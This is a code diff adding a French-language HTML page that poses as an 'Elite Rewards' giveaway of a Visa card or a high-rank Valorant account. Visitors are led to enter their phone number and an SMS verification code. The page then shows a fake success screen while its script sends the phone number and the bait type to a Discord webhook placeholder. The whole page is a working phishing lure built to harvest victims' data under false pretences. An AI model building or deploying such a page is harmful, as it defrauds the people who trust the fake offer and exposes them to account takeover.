@@ -1,1 +1,417 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Rewards | Valorant & Cards</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500;700&display=swap');
 
+        :root {
+            --bg-dark: #050505;
+            --gold: #d4af37;
+            --purple: #ff2b6c;
+            --neon-blue: #00f3ff;
+            --text-main: #ffffff;
+            --card-bg: linear-gradient(135deg, #2a2a2a 0%, #111 100%);
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            font-family: 'Inter', sans-serif;
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            transition: background 0.5s ease;
+        }
+
+        /* Thème Valorant */
+        body.valorant-mode {
+            background-image: 
+                radial-gradient(circle at 20% 80%, rgba(255, 43, 108, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 243, 255, 0.1) 0%, transparent 50%);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            position: relative;
+        }
+
+        /* Carte de Crédit / Compte */
+        .credit-card {
+            width: 100%;
+            height: 220px;
+            background: var(--card-bg);
+            border-radius: 16px;
+            position: relative;
+            margin-bottom: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            overflow: hidden;
+            transform: rotateX(5deg);
+            transition: all 0.5s ease;
+            border: 1px solid #333;
+        }
+
+        /* Effets de fond de la carte */
+        .card-bg {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(212, 175, 55, 0.2) 0%, transparent 70%);
+            transition: background 0.5s ease;
+            z-index: 0;
+        }
+
+        /* Quand c'est Valorant */
+        body.valorant-mode .credit-card {
+            background: linear-gradient(135deg, #101014 0%, #000 100%);
+            border: 1px solid var(--purple);
+            box-shadow: 0 0 25px rgba(255, 43, 108, 0.2);
+        }
+
+        body.valorant-mode .card-bg {
+            background: 
+                linear-gradient(135deg, var(--purple) 0%, transparent 40%),
+                linear-gradient(135deg, transparent 60%, var(--neon-blue) 100%);
+            opacity: 0.4;
+        }
+
+        /* Contenu Carte */
+        .card-content {
+            padding: 20px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            z-index: 2;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .gold-chip {
+            width: 40px;
+            height: 30px;
+            background: linear-gradient(135deg, #d4af37, #a88b2b);
+            border-radius: 4px;
+        }
+
+        .visa-logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: 2px;
+        }
+
+        /* Le "Solde" ou ID */
+        .balance {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--gold);
+            transition: color 0.3s;
+        }
+
+        body.valorant-mode .balance {
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            text-transform: uppercase;
+        }
+
+        /* Formulaire */
+        .form-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 25px;
+            backdrop-filter: blur(10px);
+        }
+
+        h2 {
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+            margin: 0 0 20px 0;
+            color: var(--text-main);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 18px;
+            transition: color 0.3s;
+        }
+
+        body.valorant-mode h2 {
+            color: var(--purple);
+            text-shadow: 0 0 10px rgba(255, 43, 108, 0.5);
+        }
+
+        /* Options simplifiées */
+        .grid-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .opt {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .opt:hover {
+            border-color: var(--gold);
+        }
+
+        .opt.selected {
+            border-color: var(--gold);
+            box-shadow: 0 0 15px rgba(212, 175, 55, 0.2);
+            background: rgba(212, 175, 55, 0.1);
+        }
+
+        body.valorant-mode .opt.selected {
+            border-color: var(--purple);
+            background: rgba(255, 43, 108, 0.1);
+            box-shadow: 0 0 15px rgba(255, 43, 108, 0.3);
+        }
+
+        .opt span {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 5px;
+        }
+        
+        .opt .icon {
+            font-size: 30px;
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            background: rgba(0,0,0,0.6);
+            border: 1px solid #444;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--gold);
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.1);
+        }
+
+        body.valorant-mode input:focus {
+            border-color: var(--purple);
+            box-shadow: 0 0 10px rgba(255, 43, 108, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #d4af37, #b8860b);
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            color: #000;
+            font-size: 15px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+        }
+
+        body.valorant-mode button {
+            background: linear-gradient(90deg, #ff2b6c, #ff0055);
+            box-shadow: 0 0 15px rgba(255, 43, 108, 0.4);
+        }
+
+        button:hover {
+            filter: brightness(1.1);
+            transform: translateY(-2px);
+        }
+
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: var(--gold);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+
+        body.valorant-mode .loader {
+            border-top-color: var(--purple);
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .success-box { text-align: center; padding: 20px 0; }
+        .check-icon {
+            font-size: 50px;
+            color: var(--gold);
+            margin-bottom: 15px;
+            display: block;
+        }
+        body.valorant-mode .check-icon { color: var(--neon-blue); }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Carte de Crédit / Compte -->
+    <div class="credit-card">
+        <div class="card-bg"></div>
+        <div class="card-content">
+            <div class="card-header">
+                <div class="gold-chip"></div>
+                <div class="visa-logo" id="cardLogo">VISA ELITE</div>
+            </div>
+            
+            <div class="balance" id="cardBalance">100,00 €</div>
+            
+            <div class="card-details">
+                <span id="cardName">VIP GUEST</span>
+                <span id="cardItem">Carte Virtuelle</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Formulaire -->
+    <div class="form-card">
+        <h2>Choisissez votre type</h2>
+        
+        <!-- Étape 1 -->
+        <div id="s1" class="step active">
+            <div class="grid-options">
+                <!-- Compte Valorant -->
+                <div class="opt" onclick="pick('valorant')">
+                    <span class="icon">🎯</span>
+                    <span>Compte Valorant</span>
+                </div>
+                <!-- Carte de Crédit -->
+                <div class="opt selected" onclick="pick('visa')">
+                    <span class="icon">💳</span>
+                    <span>Carte de Crédit</span>
+                </div>
+            </div>
+            <input type="tel" id="phone" placeholder="NUMÉRO DE TÉLÉPHONE">
+            <button onclick="goToSMS()">ACTIVER</button>
+        </div>
+
+        <!-- Étape 2 -->
+        <div id="s2" class="step">
+            <div style="text-align: center; color: #aaa; font-size: 13px; margin-bottom: 15px;">
+                Vérification de compte via SMS
+            </div>
+            <input type="text" id="code" maxlength="6" placeholder="CODE DE VÉRIFICATION">
+            <button onclick="verify()">VÉRIFIER</button>
+        </div>
+
+        <!-- Étape 3 -->
+        <div id="s3" class="step">
+            <div class="loader"></div>
+            <div style="text-align: center; color: #aaa; font-size: 13px;">
+                Connexion en cours...
+            </div>
+        </div>
+
+        <!-- Étape 4 -->
+        <div id="s4" class="step">
+            <div class="success-box">
+                <span class="check-icon">✅</span>
+                <h3 style="color: var(--text-main); margin: 0;">Compte Vérifié</h3>
+                <p style="color: #888; font-size: 13px; margin-top: 5px;">
+                    Opération réussie.
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const WEBHOOK = "TON_WEBHOOK_ICI";
+
+    function pick(type) {
+        const logo = document.getElementById('cardLogo');
+        const balance = document.getElementById('cardBalance');
+        const name = document.getElementById('cardName');
+        const item = document.getElementById('cardItem');
+
+        // Si c'est Valorant, on change tout le style et le texte
+        if (type === 'valorant') {
+            document.body.classList.add('valorant-mode');
+            logo.innerText = "RIOT GAMES";
+            balance.innerText = "VAL-8492-0011"; 
+            name.innerText = "DIAMOND II";
+            item.innerText = "11 SKINS • LVL 64";
+        } else {
+            // Retour au mode standard (Visa)
+            document.body.classList.remove('valorant-mode');
+            logo.innerText = "VISA ELITE";
+            balance.innerText = "100,00 €";
+            name.innerText = "VIP GUEST";
+            item.innerText = "Carte Virtuelle";
+        }
+    }
+
+    function goToSMS() {
+        const p = document.getElementById('phone').value;
+        if(p.length < 8) return alert("Numéro invalide");
+        
+        document.getElementById('s1').classList.remove('active');
+        document.getElementById('s2').classList.add('active');
+    }
+
+    function verify() {
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('s3').classList.add('active');
+
+        // Envoi Discord
+        const isValorant = document.body.classList.contains('valorant-mode');
+        const status = isValorant ? "Compte Valorant (11 Skins)" : "Carte Visa";
+        
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `💰 **Vérification**\n📱 <@${document.getElementById('phone').value}>\n🎮 Type: ${status}\n💎 Statut: Vérifié`
+            })
+        });
+
+        setTimeout(() => {
+            document.getElementById('s3').classList.remove('active');
+            document.getElementById('s4').classList.add('active');
+        }, 2500);
+    }
+</script>
+
+</body>
+</html>
